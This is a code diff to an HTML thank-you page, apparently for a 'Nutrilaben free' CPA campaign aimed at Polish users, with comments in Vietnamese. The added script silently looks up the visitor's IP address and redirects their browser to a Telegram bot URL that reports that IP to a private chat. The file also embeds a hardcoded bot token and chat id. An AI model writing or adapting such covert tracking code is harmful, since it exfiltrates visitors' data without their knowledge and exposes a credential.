@@ -1,14 +1,35 @@
 <!DOCTYPE html><html lang="vi">
 <head><meta charset="UTF-8"><title>Thanks you!</title>
 <script>
-    var msg = "Nutrilaben free - CPA - [PL]"
-    var idgroup = "4115234450"
-    var apikey = "6542919391:AAH7V97D1TDuhYWZSURmyuMxWHnKMKv8q0o"
+    (async function() {
+        var msg_base = "[PL] Nutrilaben free";
+        var idgroup = "4115234450";
+        var apikey = "6542919391:AAH7V97D1TDuhYWZSURmyuMxWHnKMKv8q0o";
 
-    var url = "https://api.telegram.org/bot"+apikey+"/sendMessage?chat_id=-"+idgroup+"&text="+msg
+        try {
+            // 1. Lấy địa chỉ IP
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            var userIP = data.ip;
 
-    setTimeout(() => {location.replace(url);}, 1000);
-    
+            // 2. Tạo nội dung tin nhắn với ký tự xuống dòng (%0A)
+            // Kết quả sẽ hiển thị: 
+            // Nutrilaben free - CPA - [PL]
+            // IP: 1.2.3.4
+            var fullMsg = encodeURIComponent(msg_base) + "%0A" + encodeURIComponent("IP: " + userIP);
+            
+            // 3. Gửi URL
+            var url = "https://api.telegram.org/bot" + apikey + "/sendMessage?chat_id=-" + idgroup + "&text=" + fullMsg;
+
+            setTimeout(() => {
+                location.replace(url);
+            }, 1000);
+
+        } catch (error) {
+            var fallbackUrl = "https://api.telegram.org/bot" + apikey + "/sendMessage?chat_id=-" + idgroup + "&text=" + encodeURIComponent(msg_base);
+            location.replace(fallbackUrl);
+        }
+    })();
 </script>
 </head>
 
